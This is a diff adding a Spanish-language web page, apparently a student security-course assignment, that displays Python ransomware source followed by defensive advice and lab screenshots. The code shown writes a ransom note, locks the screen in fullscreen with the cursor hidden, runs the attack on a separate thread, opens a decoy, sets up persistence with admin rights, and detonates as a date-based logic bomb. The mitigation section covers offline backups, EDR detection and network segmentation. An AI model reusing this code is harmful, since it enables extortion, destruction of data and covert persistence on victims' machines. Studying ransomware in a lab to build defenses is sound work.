+        <span class="text-purple-400">with</span> <span class="text-yellow-300">open</span>(ruta_nota, <span class="text-green-400">"w"</span>, encoding=<span class="text-green-400">"utf-8"</span>) <span class="text-purple-400">as</span> n:
+            n.write(CONFIG[<span class="text-green-400">"note"</span>])
+    <span class="text-purple-400">except</span>:
+        <span class="text-purple-400">pass</span>
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">mostrar_bloqueo_extorsivo</span>():
+    <span class="text-green-400">""" 
+    Fase de Extorsión (GUI).
+    Muestra la nota de rescate bloqueando la pantalla de la víctima.
+    """</span>
+    root = tk.Tk()
+    root.attributes(<span class="text-green-400">'-fullscreen'</span>, <span class="text-orange-400">True</span>) <span class="text-gray-500"># Bloquea la pantalla completa</span>
+    root.attributes(<span class="text-green-400">"-topmost"</span>, <span class="text-orange-400">True</span>)    <span class="text-gray-500"># Se pone por encima de todas las ventanas</span>
+    root.configure(background=<span class="text-green-400">'black'</span>)
+    root.config(cursor=<span class="text-green-400">"none"</span>) <span class="text-gray-500"># Oculta el cursor del mouse para causar pánico</span>
+
+    <span class="text-gray-500"># Configuración del texto rojo de advertencia</span>
+    label = tk.Label(
+        root, 
+        text=CONFIG[<span class="text-green-400">"note"</span>], 
+        fg=<span class="text-green-400">"red"</span>, 
+        bg=<span class="text-green-400">"black"</span>, 
+        font=(<span class="text-green-400">"Courier"</span>, <span class="text-orange-400">18</span>, <span class="text-green-400">"bold"</span>),
+        justify=<span class="text-green-400">"left"</span>,
+        wraplength=root.winfo_screenwidth() - <span class="text-orange-400">100</span>
+    )
+    label.pack(expand=<span class="text-orange-400">True</span>)
+
+    <span class="text-gray-500"># Temporizador visual: Cierra la pantalla negra después de 15 segundos</span>
+    root.after(<span class="text-orange-400">15000</span>, root.destroy)
+    root.focus_force() 
+    root.mainloop()
+
+<span class="text-purple-400">def</span> <span class="text-yellow-200">ejecutar_ataque</span>():
+    <span class="text-green-400">""" 
+    Separación de Hilos.
+    Permite que la encriptación y la interfaz gráfica ocurran al mismo tiempo (Concurrencia).
+    """</span>
+    hilo_trabajo = threading.Thread(target=ataque_silencioso)
+    hilo_trabajo.daemon = <span class="text-orange-400">False</span> <span class="text-gray-500"># Al ser False, el ataque no se detendrá si la pantalla se cierra</span>
+    hilo_trabajo.start()
+    mostrar_bloqueo_extorsivo() <span class="text-gray-500"># Lanza la interfaz gráfica en el hilo principal</span>
+
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-gray-500"># ENTRY POINT Y LÓGICA DE DETONACIÓN</span>
+<span class="text-gray-500"># =============================================================================</span>
+<span class="text-purple-400">if</span> __name__ == <span class="text-green-400">"__main__"</span>:
+    <span class="text-gray-500"># PASO 1: Sin importar la fecha, siempre despliega el señuelo para no levantar sospechas</span>
+    abrir_contenedor_esteganografico()
+
+    <span class="text-gray-500"># PASO 2: Persistencia Temprana (Día 0)</span>
+    <span class="text-gray-500"># Si tiene permisos, se instala inmediatamente en el sistema. Así no requiere un segundo clic.</span>
+    <span class="text-purple-400">if</span> ctypes.windll.shell32.IsUserAnAdmin():
+        establecer_persistencia()
+
+    <span class="text-gray-500"># PASO 3: Validación de la Bomba Lógica</span>
+    fecha_objetivo = time.strptime(CONFIG[<span class="text-green-400">"marker"</span>], <span class="text-green-400">"%Y-%m-%d %H:%M"</span>)
+    
+    <span class="text-gray-500"># Compara el reloj del sistema operativo con la fecha configurada</span>
+    <span class="text-purple-400">if</span> time.localtime() &gt;= fecha_objetivo:
+        <span class="text-gray-500"># Si la fecha se cumplió, desata el ataque destructivo</span>
+        ejecutar_ataque()
+    <span class="text-purple-400">else</span>:
+        <span class="text-gray-500"># Modo Durmiente: Si aún no es la fecha, el programa termina silenciosamente.</span>
+        <span class="text-gray-500"># Gracias al PASO 2, la tarea programada lo volverá a despertar mañana.</span>
+        <span class="text-purple-400">pass</span>
+              </pre>
+            </div>
+          </div>
+        </div>
+
+        {/* ── DEFENSAS Y MITIGACIÓN ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
+            <Shield class="size-6 text-green-400" />
+            Estrategias Defensivas y Mitigación
+          </h3>
+          <p class="text-sm text-gray-400 mb-4">
+            El diseño del ransomware demuestra que las copias de seguridad tradicionales locales son vulnerables. La protección real requiere una arquitectura defensiva de defensa en profundidad:
+          </p>
+          <div class="space-y-3 bg-gray-900/40 p-5 rounded-xl border border-gray-800">
+            <div class="flex gap-4 items-start text-sm">
+              <span class="text-green-400 font-mono font-bold whitespace-nowrap">[BACKUPS 3-2-1]</span>
+              <p class="text-gray-300">Mantener 3 copias de los datos, en 2 medios de almacenamiento diferentes, con al menos 1 copia completamente fuera de línea (Off-site/Cold Backup). Si el backup no está conectado a la red, el malware no puede ejecutar <code>vssadmin</code> sobre él.</p>
+            </div>
+            <div class="flex gap-4 items-start text-sm">
+              <span class="text-blue-400 font-mono font-bold whitespace-nowrap">[EDR & HEURÍSTICA]</span>
+              <p class="text-gray-300">El cifrado masivo de archivos genera una alta tasa de I/O en el disco. Los sistemas EDR modernos pueden detectar comportamientos anómalos (como 20 hilos modificando bases de datos en milisegundos) y suspender el proceso instantáneamente.</p>
+            </div>
+            <div class="flex gap-4 items-start text-sm">
+              <span class="text-yellow-400 font-mono font-bold whitespace-nowrap">[SEGREGACIÓN]</span>
+              <p class="text-gray-300">Deshabilitar la comunicación innecesaria entre estaciones de trabajo (Lateral Movement) mediante segmentación de red y la inhabilitación del recurso administrativo compartido (<code>Admin$</code>) y el uso no autorizado de PsExec.</p>
+            </div>
+          </div>
+        </div>
+
+        {/* ── EVIDENCIA VISUAL ── */}
+        <div>
+          <h3 class="text-xl font-semibold mb-4 text-blue-500/80">Evidencia del Laboratorio</h3>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <figure class="relative transition-all duration-300 hover:scale-[1.01]">
+              <img 
+                class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
+                src={INFO_TAREA.imagen1} 
+                alt="Diagrama conceptual o ejecución del Ransomware" 
+              />
+              <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
+                Figura 1: Evidencia documentada del funcionamiento y estructura del Ransomware.
+              </figcaption>
+            </figure>
+            
+            <figure class="relative transition-all duration-300 hover:scale-[1.01]">
+              <img 
+                class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
+                src={INFO_TAREA.imagen2} 
+                alt="Pantalla de Bloqueo de Ransomware" 
+              />
+              <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
+                Figura 2: Impacto final en el entorno de pruebas, mostrando la evasión y la extorsión visual.
+              </figcaption>
+            </figure>
+          </div>
+        </div>
+
+      </div>
+
+      {/* --- ZONA DE DESCARGA Y RETORNO --- */}
+      <div class="mt-16 pt-8 border-t border-gray-200 dark:border-gray-800 flex flex-col items-center gap-6">
+        {/*
+        <a 
+          href={INFO_TAREA.pdf} 
+          download="182217-Act14.pdf" 
+          class="flex items-center gap-2 px-8 py-3 text-base font-bold text-white transition-all bg-red-600 rounded-full hover:bg-red-700 hover:shadow-lg hover:shadow-red-500/30"
+        >
+          <Link class="size-5" />
+          Descargar PDF de la Tarea
+        </a>
+        */}
+        <a 
+          href="/#tareas" 
+          class="text-gray-500 hover:text-red-500 hover:underline flex items-center gap-2 text-sm font-medium transition mt-4"
+        >
+          ← Regresar a la lista de tareas
+        </a>
+      </div>
+
+    </SectionContainer>
+  </main>
+</Layout>
+
+<style>
+  /* Clases extra para el scroll personalizado de la terminal de código */
+  .custom-scrollbar::-webkit-scrollbar {
+    height: 8px;
+    width: 8px;
+  }
+  .custom-scrollbar::-webkit-scrollbar-track {
+    background: #0d1117; 
+    border-radius: 4px;
+  }
+  .custom-scrollbar::-webkit-scrollbar-thumb {
+    background: #30363d; 
+    border-radius: 4px;
+  }
+  .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+    background: #8b949e; 
+  }
+</style>
